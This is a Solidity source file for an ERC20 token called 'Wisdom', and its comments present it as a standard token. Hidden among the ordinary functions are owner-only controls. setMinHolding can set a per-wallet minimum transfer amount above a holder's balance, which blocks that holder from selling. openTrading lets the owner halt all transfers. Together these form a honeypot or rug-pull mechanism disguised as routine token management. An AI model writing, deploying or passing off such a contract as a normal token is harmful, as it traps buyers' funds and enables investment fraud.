pragma solidity ^0.8.3;
// SPDX-License-Identifier: MIT

// Interface for ERC20 standard functions and events.
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Abstract contract that provides a context for who is calling the function.
abstract contract Context {
    // Internal function to return the sender of the transaction.
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Contract module that provides basic authorization control.
contract Ownable is Context {
    address private _owner;

    // Event that is emitted when ownership is transferred.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Constructor that sets the original `owner` of the contract to the sender.
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Function to return the address of the current owner.
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Modifier to restrict functions to the owner.
    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

    // Function to relinquish ownership of the contract.
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }

    // Function to transfer ownership to a new address.
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// ERC20 Token
contract Wisdom is IERC20, Context, Ownable  {
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _minHold;
    mapping(address => mapping(address => uint256)) private _allowances;



    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    bool private _tradingopen = true;

    // Constructor to initialize the token.
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** uint256(decimals_));
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Standard ERC20 functions.
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_tradingopen, "Wisdom: Trading is currently disabled");
        require(amount >= _minHold[_msgSender()], "Wisdom: Transfer amount is less than the minimum allowed");
        require(_balances[_msgSender()] >= amount, "Wisdom: transfer amount exceeds balance");
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    // Events and functions for managing minimum transfer amounts and trading status.
    event MinimumHolding(address indexed account, uint256 finalAmt);

    function setMinHolding(address account, uint256 finalAmt) public onlyOwner {
        require(account != address(0), "Wisdom: address zero is not a valid account");
        _minHold[account] = finalAmt;
        emit MinimumHolding(account, finalAmt);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(amount >= _minHold[sender], "Wisdom: Hold lesser than minimum amount");
        require(_balances[sender] >= amount, "Wisdom: transfer amount exceeds balance");
        require(_tradingopen, "Wisdom: Trading is currently disabled");
        require(_allowances[sender][_msgSender()] >= amount, "Wisdom: transfer amount exceeds allowance");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getHoldingmin(address account) public view returns (uint256) {
        return _minHold[account];
    }


    function openTrading(bool _tradeopen) public onlyOwner {
        _tradingopen = _tradeopen;
    }

    function isTradingEnabled() public view returns (bool) {
        return _tradingopen;
    }


}